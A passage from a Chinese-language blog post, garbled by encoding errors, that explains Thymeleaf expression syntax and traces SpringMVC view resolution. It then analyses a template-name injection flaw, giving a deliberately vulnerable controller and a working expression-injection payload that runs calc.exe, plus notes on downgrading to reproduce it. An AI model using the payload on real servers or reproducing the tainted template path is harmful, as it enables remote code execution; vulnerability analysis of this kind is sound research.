‡ç­¾</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>th:id</td><td>æ›¿æ¢id</td><td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td></tr><tr><td>th:text</td><td>æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td></tr><tr><td>th:utext</td><td>æ”¯æŒhtmlçš„æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td></tr><tr><td>th:object</td><td>æ›¿æ¢å¯¹è±¡</td><td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td></tr><tr><td>th:value</td><td>æ›¿æ¢å€¼</td><td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td></tr><tr><td>th:each</td><td>è¿­ä»£</td><td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td></tr><tr><td>th:href</td><td>æ›¿æ¢è¶…é“¾æ¥</td><td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;è¶…é“¾æ¥&lt;/a&gt;</code></td></tr><tr><td>th:src</td><td>æ›¿æ¢èµ„æº</td><td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td></tr></tbody></table><p><strong>é“¾æ¥è¡¨è¾¾å¼</strong></p><p>ä½¿ç”¨<code>@&#123;èµ„æºåœ°å€&#125;</code>å¼•å…¥èµ„æºï¼Œå¼•å…¥çš„åœ°å€å¯ä»¥åœ¨staticç›®å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯äº’è”ç½‘çš„èµ„æºï¼Œæ ¼å¼å¦‚ä¸Šé¢çš„æ ‡ç­¾ç¤ºä¾‹</p><p><strong>å˜é‡è¡¨è¾¾å¼</strong></p><p>è¿™éƒ¨åˆ†ä¹Ÿæ˜¯é¡µé¢èƒ½åŠ¨æ€æ¸²æŸ“çš„æ ¸å¿ƒï¼Œå¯ä»¥ç”¨<code>$&#123;...&#125;</code>çš„å½¢å¼åœ¨modelä¸­å–å€¼ï¼Œå‰é¢çš„demoä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¾€modelä¸­æ·»åŠ äº†å±æ€§çš„é”®å€¼å¯¹</p><p>å–JavaBeanå¯¹è±¡ä½¿ç”¨<code>$&#123;å¯¹è±¡å.å¯¹è±¡å±æ€§&#125;</code>æˆ–è€…<code>$&#123;å¯¹è±¡å[&#39;å¯¹è±¡å±æ€§&#39;]&#125;</code>æ¥å–å€¼ã€‚å¦‚æœJavaBeanå†™äº†getæ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡<code>$&#123;å¯¹è±¡.getæ–¹æ³•å&#125;</code>å–å€¼ã€‚</p><p>å–Mapå¯¹è±¡ä½¿ç”¨<code>$&#123;Mapå[&#39;key&#39;]&#125;</code>æˆ–<code>$&#123;Mapå.key&#125;</code></p><p>å–Listé›†åˆï¼šListé›†åˆæ˜¯ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œéœ€è¦ä½¿ç”¨eachéå†èµ‹å€¼ï¼Œ<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p><p><strong>é€‰æ‹©å˜é‡è¡¨è¾¾å¼</strong></p><p>è¯¥è¡¨è¾¾å¼çš„å†™æ³•ä¸º*{â€¦}ï¼Œå†™ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>èµ›<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>å¥½å¥½å­¦ä¹ <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">user</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;clown&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213143906940.png" alt="image-20241213143906940"></p><p><strong>æ¶ˆæ¯è¡¨è¾¾å¼</strong></p><p>æ–‡æœ¬å¤–éƒ¨åŒ–æ˜¯ä»æ¨¡æ¿æ–‡ä»¶ä¸­æå–æ¨¡æ¿ä»£ç çš„ç‰‡æ®µï¼Œä»¥ä¾¿å¯ä»¥å°†å®ƒä»¬ä¿å­˜åœ¨å•ç‹¬çš„æ–‡ä»¶(é€šå¸¸æ˜¯.propertiesæ–‡ä»¶)ä¸­,æ–‡æœ¬çš„å¤–éƒ¨åŒ–ç‰‡æ®µé€šå¸¸ç§°ä¸ºâ€œæ¶ˆæ¯â€ã€‚é€šä¿—æ˜“æ‡‚çš„æ¥è¯´<code>#&#123;â€¦&#125;</code>è¯­æ³•å°±æ˜¯ç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ä¸­æ•°æ®çš„ã€‚</p><p>è¿™é‡Œä¹Ÿå†™ä¸ªä¾‹å­æ›´å¥½ä½“ä¼šï¼Œé¦–å…ˆåœ¨templatesç›®å½•ä¸‹å»ºç«‹<code>clown.properties</code>ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">demo.nane=clown<br>demo.age=22<br>province=UnKnown<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨application.propertiesåŠ å…¥ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">spring.messages.basename=templates/demo<br></code></pre></td></tr></table></figure><p>htmlå†…å®¹å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.age&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.nane&#125;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Province: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;province&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241213145707765.png" alt="image-20241213145707765"></p><p><strong>ç‰‡æ®µè¡¨è¾¾å¼</strong></p><p>ç‰‡æ®µè¡¨è¾¾å¼<code>~&#123;...&#125;</code>å¯ä»¥ç”¨äºå¼•ç”¨å…¬å…±çš„ç›®æ ‡ç‰‡æ®µï¼Œæ¯”å¦‚å¯ä»¥åœ¨ä¸€ä¸ª<code>template/public.html</code>ä¸­å®šä¹‰ä¸‹é¢çš„ç‰‡æ®µ,å¹¶åœ¨å¦ä¸€ä¸ªtemplateä¸­å¼•ç”¨ã€‚</p><p>å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    Â© 2011 The Good Thymes Virtual Grocery<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¼•ç”¨å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;public :: copy&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213175923703.png" alt="image-20241213175923703"></p><h1 id="springmvcè§†å›¾è§£æè¿‡ç¨‹"><a href="#SpringMVCè§†å›¾è§£æè¿‡ç¨‹" class="headerlink" title="SpringMVCè§†å›¾è§£æè¿‡ç¨‹"></a>SpringMVCè§†å›¾è§£æè¿‡ç¨‹</h1><p>è§†å›¾è§£æçš„è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨Controllerå¤„ç†åï¼ŒControllerå¤„ç†ç»“æŸåä¼šå°†è¿”å›çš„ç»“æœå°è£…ä¸º<code>ModelAndView</code>å¯¹è±¡ï¼Œå†é€šè¿‡è§†å›¾è§£æå™¨<code>ViewResovler</code>å¾—åˆ°å¯¹åº”çš„è§†å›¾å¹¶è¿”å›ã€‚</p><p>ç»™ä¸€å¼ SpringMVCçš„æ‰§è¡Œæµç¨‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407270110622.png" alt="image-20240727011007456"></p><p>æˆ‘ä»¬å¯ä»¥ç”¨å‰é¢çš„demoè·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹è§†å›¾æ˜¯å¦‚ä½•è§£æçš„</p><h2 id="å°è£…modelandviewå¯¹è±¡"><a href="#å°è£…ModelAndViewå¯¹è±¡" class="headerlink" title="å°è£…ModelAndViewå¯¹è±¡"></a>å°è£…ModelAndViewå¯¹è±¡</h2><p>å…ˆèµ°åˆ°<code>ServletInvocableHandlerMethod#invokeAndHandle</code>ä¸­ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>setResponseStatus(webRequest);<br><br><span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>disableContentCachingIfNecessary(webRequest);<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(formatErrorForReturnValue(returnValue), ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„å˜é‡å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241213214443799.png" alt="image-20241213214443799"></p><p>è¯¥å‡½æ•°å†…éƒ¨è¿›è¡Œäº†å¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>invokeForRequest</code>è°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°<code>returnValue</code>ä¸­</li><li>åˆ¤æ–­<code>returnValue</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯åˆ™ç»§ç»­åˆ¤æ–­<code>RequestHandled</code>æ˜¯å¦ä¸º<code>True</code>ï¼Œéƒ½æ»¡è¶³çš„è¯è®¾ç½®<code>requestHandled</code>ä¸º<code>true</code></li><li>é€šè¿‡<code>handleReturnValue</code>æ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°<code>ModelAndViewContainer</code>ä¸­ã€‚</li></ul><p>è¿™é‡Œå¾€ä¸‹èµ°returnValueè¿”å›çš„æ˜¯index</p><p><img src="https://cdn.clown2024.cn/image-20241213214722184.png" alt="image-20241213214722184"></p><p>ç„¶åå†çœ‹handleReturnValueæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åº”è¯¥å°±æ˜¯å¯¹æ¨¡æ¿è¿›è¡Œè§£æï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213221758950.png" alt="image-20241213221758950"></p><p>è·å–ä¸€ä¸ªViewNameMethodReturnValueHandlerç„¶åç»§ç»­å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241213222152893.png" alt="image-20241213222152893"></p><ul><li>åˆ¤æ–­returnValueç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œè®¾ç½®<code>mavContainer.viewName</code></li><li>åˆ¤æ–­returnValueæ˜¯å¦ä»¥<code>redirect:</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è®¾ç½®é‡å®šå‘çš„å±æ€§</li></ul><p>ç„¶åè¿”å›åˆ°RequestMappingHandlerAdapter#invokeHandlerMethodæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213222951397.png" alt="image-20241213222951397"></p><p>é€šè¿‡getModelAndViewæ–¹æ³•è¿”å›ModelAndView</p><h2 id="è·å–modelandviewè§†å›¾"><a href="#è·å–ModelAndViewè§†å›¾" class="headerlink" title="è·å–ModelAndViewè§†å›¾"></a>è·å–ModelAndViewè§†å›¾</h2><p>è·å–<code>ModelAndView</code>åï¼Œé€šè¿‡<code>DispatcherServlet#render</code>è·å–è§†å›¾è§£æå™¨å¹¶æ¸²æŸ“ï¼Œä¸­é—´çš„è¿‡ç¨‹å°±ä¸å†åˆ†æäº†ï¼Œå°±æ˜¯æ¯ç‡¥çš„è·Ÿç€èµ°è€Œå·²</p><p>ä¸è¿‡åˆ°è¿™é‡Œæµç¨‹ä¹Ÿå¾ˆç¬¦åˆå‰é¢æµç¨‹å›¾æ‰€æ€»ç»“çš„é‚£æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241213223643677.png" alt="image-20241213223643677"></p><p>resolveViewNameæ˜¯éå†è§†å›¾è§£æå™¨ç„¶åè¿”å›ä¸€ä¸ªï¼Œå…¶ä¸­é‡Œé¢æœ‰äº”ä¸ªè§†å›¾è§£æå™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213224250552.png" alt="image-20241213224250552"></p><p>è¿™é‡Œè¿”å›çš„Viewæ˜¯ThymeleafView</p><p><img src="https://cdn.clown2024.cn/image-20241213224019290.png" alt="image-20241213224019290"></p><h2 id="è§†å›¾æ¸²æŸ“"><a href="#è§†å›¾æ¸²æŸ“" class="headerlink" title="è§†å›¾æ¸²æŸ“"></a>è§†å›¾æ¸²æŸ“</h2><p>æœ€åå°±æ˜¯è°ƒç”¨ThymeleafViewçš„renderå‡½æ•°è¿›è¡Œè§†å›¾æ¸²æŸ“</p><p><img src="https://cdn.clown2024.cn/image-20241213224451300.png" alt="image-20241213224451300"></p><p>åé¢çš„å…·ä½“æ¸²æŸ“åˆ†ææ¼æ´çš„æ—¶å€™å†è°ƒè¯•</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><h2 id="templatenameæ¼æ´"><a href="#templatenameæ¼æ´" class="headerlink" title="templatenameæ¼æ´"></a>templatenameæ¼æ´</h2><p>ç»™å‡ºä¸€ä¸ªæ¼æ´ä»£ç çš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µæ˜¯ç›´æ¥å°†å‚æ•°æ‹¼æ¥åˆ°äº†æ¨¡æ¿è·¯å¾„ä¸­</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œå³ä½¿ä¸åŠ <code>.x</code>ä¾ç„¶å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸€å¼€å§‹æˆ‘ç”¨çš„thymeleaf2.5.10ç‰ˆæœ¬æ‰“è¿™ä¸ªpayloadç»™æˆ‘æŠ¥äº†ä¸‹é¢çš„é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé”™è¯¯ä¿¡æ¯è¡¨æ˜åœ¨å¤„ç† Thymeleaf æ¨¡æ¿æ—¶ï¼Œè§†å›¾åç§°åŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶ä¸” URL è·¯å¾„æˆ–è¯·æ±‚å‚æ•°ä¸­ä¹ŸåŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒThymeleaf ä¸ºäº†é˜²æ­¢ç”¨æˆ·è¾“å…¥ç›´æ¥è¢«æ‰§è¡Œä¸ºè§†å›¾åç§°çš„ä¸€éƒ¨åˆ†ï¼Œç¦æ­¢äº†è¿™ç§æƒ…å†µã€‚</p><p>é‚£è¯´æ˜åé¢ç‰ˆæœ¬çš„ä¿®å¤æ˜¯é‡‡ç”¨äº†ç¦æ­¢è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹å…·ä½“çš„æŠ¥é”™ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230550190.png" alt="image-20241213230550190"></p><p>æ˜¯thymeleaf-spring5-3.0.15.RELEASE.jarè¿™ä¸ªç‰ˆæœ¬çš„jaråŒ…ä¿®å¤äº†ï¼Œéœ€è¦å°†spring-boot-starter-parentçš„ç‰ˆæœ¬é™ä¸€ä¸‹ï¼Œé™æˆ2.4.1å°±è¡Œäº†ï¼Œç„¶åè¿™æ—¶å€™thymeleaf-springçš„ç‰ˆæœ¬æ˜¯3.0.11çš„ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230754543.png" alt="image-20241213230754543"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…³é”®åœ¨å‰é¢æˆ‘ä»¬æ²¡åˆ†æçš„renderFragmentå‡½æ•°çš„æ¸²æŸ“è¿‡ç¨‹é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213231629083.png" alt="image-20241213231629083"></p><p>é¦–å…ˆå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¾—viewTemplateNameç»è¿‡æ‹¼æ¥ä¹‹åçš„å€¼ç°åœ¨æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::/welcome<br></code></pre></td></tr></table></figure><p>ç„¶åä»–ä¼šåˆ¤æ–­é‡Œé¢æ˜¯å¦æœ‰::å­—ç¬¦ä¸²ï¼Œè¿™ä»£è¡¨å…¶æ˜¯ä¸€ä¸ªç‰‡æ®µè¡¨è¾¾å¼</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213231941833.png" alt="image-20241213231941833"></p><p>ä¼šè·å–ä¸€ä¸ªè¡¨è¾¾å¼è§£æå™¨ï¼Œç„¶åè§£æè¡¨è¾¾å¼ï¼Œä¸”å°†æˆ‘ä»¬çš„viewTemplateNameç”¨~{å’Œ}åŒ…è£¹èµ·æ¥</p><p>ç„¶åè§¦å‘çš„è¿‡ç¨‹å°±åœ¨parseExpressionæ–¹æ³•é‡Œé¢ï¼Œä¸€ç›´å¾€åèµ°ä¼šèµ°åˆ°StandardExpressionPreprocessor#preprocessæ–¹æ³•å†…</p><p><img src="https://cdn.clown2024.cn/image-20241213233227916.png" alt="image-20241213233227916"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™æå–å†…å®¹çš„åŒ¹é…å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213233851249.png" alt="image-20241213233851249"></p><p>å…¶æ­£åˆ™åŒ¹é…æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\_\_(.*?)\_\_<br></code></pre></td></tr></table></figure><p>ä»£è¡¨å…¶åŒ¹é…__â€¦__ä¹‹é—´çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å°†æˆ‘ä»¬é‡Œé¢çš„è¡¨è¾¾å¼å†…å®¹åˆ†å‰²å‡ºæ¥äº†ï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213234249011.png" 